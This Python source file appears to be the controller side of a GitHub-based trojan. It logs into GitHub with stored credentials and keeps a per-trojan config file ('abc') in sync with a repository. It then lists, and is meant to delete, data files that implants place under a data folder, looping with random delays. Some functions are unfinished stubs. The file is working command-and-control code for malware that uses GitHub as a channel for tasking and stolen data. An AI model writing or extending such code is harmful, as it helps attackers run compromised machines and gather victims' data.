import base64
import imp
import inspect
import json
import os
import random
import sys
import threading
import time
import queue

from cryptography import *
from git import cmd
from github3 import login


# Get account data and public key
with open('config/keys.json') as json_data:
	account_data = json.load(json_data)[0]

u_branch     = account_data['branch']
u_name       = account_data['username']
u_pass       = account_data['password']
u_repo       = account_data['repository']
u_reposerver = account_data['reposerver']
key          = account_data['cipher_key']


# Init main variables
trojan_id          = "abc"
trojan_config_path = "config/{0}.json".format(trojan_id)
trojan_data_path   = "data/{0}/".format(trojan_id)

task_queue = queue.Queue()


def connect_to_github():
	gh = login(username=u_name, password=u_pass)
	repo = gh.repository(u_name, u_repo)
	branch = repo.branch(u_branch)

	return gh, repo, branch


def get_file_contents(filepath, f=None):

	gh, repo, branch = connect_to_github()

	# initialize remote tree
	tree = branch.commit.commit.tree.recurse()

	# loop trough tree array
	for filename in tree.tree:

		# find filepath in tree object
		if filepath in filename.path:
			print("[*] Found file {0}".format(filepath))
			blob = repo.blob(filename._json_data['sha'])

			if f == 'b':
				return blob
			else:
				return blob.content

	return None


def compare_remote_config():
	"""
		Compares github config with local.
		Updates corrupted, deleted data.

		TODO:
	"""

	local_config = open(trojan_config_path)
	local_config = json.load(local_config)

	local_config_json = json.dumps(local_config)
	local_config_byte = "{0}".format(local_config_json).encode()

	remote_blob = get_file_contents(trojan_config_path, 'b')

	if not remote_blob:
		print("[!] Can't find the file!")

		gh, repo, branch = connect_to_github()

		print("[+] Creating config file...")
		repo.create_file(trojan_config_path, "Deleted config file auto update", local_config_byte)
		print('[=] Exiting')

		return None

	try:
		remote_config = json.loads(base64.b64decode(remote_blob.content))
	except json.decoder.JSONDecodeError:
		print("[!] Remote json corrupted!")

		gh, repo, branch = connect_to_github()

		remote_sha = remote_blob.sha

		print("[+] Updating corrupted config file...")
		repo.update_file(trojan_config_path, "Corrupted config file auto update.", local_config_byte, remote_sha)
		print("[=] Exiting")

		return None

	if local_config != remote_config:
		gh, repo, branch = connect_to_github()

		remote_sha = remote_blob.sha

		print('[+] Updating config file...')
		repo.update_file(trojan_config_path, "Config file auto update.", local_config_byte, remote_sha)
		print("[=] Exiting.")

	return None


def pull_remote_data(reponame, branch):
	"""
		Pulls data from remote repository.

		TODO: add optional path to pulling
	"""

	try:
		git_local = cmd.Git('.')
		print("[+] Pulling files")
		git_local.pull(reponame, branch)
	except:
		print("Unexpected error in %s:" % inspect.stack()[0][3], sys.exc_info()[0])
		raise

	return None


def clean_remote_data(pathname):
	"""
		Cleans remote data after pull.

		TODO: don't pull if remote_dir is empty
	"""

	gh, repo, branch = connect_to_github()
	tree = branch.commit.commit.tree.recurse()

	# TODO
	#pull_remote_data(u_reposerver, u_branch)

	for datafile in tree.tree:
		if pathname in datafile.path:

			datafile_blob = repo.blob(datafile._json_data['sha'])

			try:
				print("Deleting: %s" % datafile.path)
				#repo.delete_file(datafile.path, 'Data files auto delete', datafile_blob.sha)
			except:
				print("Unexpected error in %s:" % inspect.stack()[0][3], sys.exc_info()[0])
				raise


	print("[=] Exiting. No new files in %s" % pathname)
	return None
#clean_remote_data(trojan_data_path)


def decode_local_data(pathname):
	"""
		Decodes list of local data.

		TODO:
	"""

	pass

decode_local_data(trojan_data_path)

def merge_local_data():
	"""
		Compares github client data with local.
		Deletes and updates spare data.

		TODO:
	"""

	pass


# server main loop

while True:

	if task_queue.empty():
		print("")

		compare_remote_config()
		clean_remote_data(trojan_data_path)

	time.sleep(random.randint(1000, 5000))
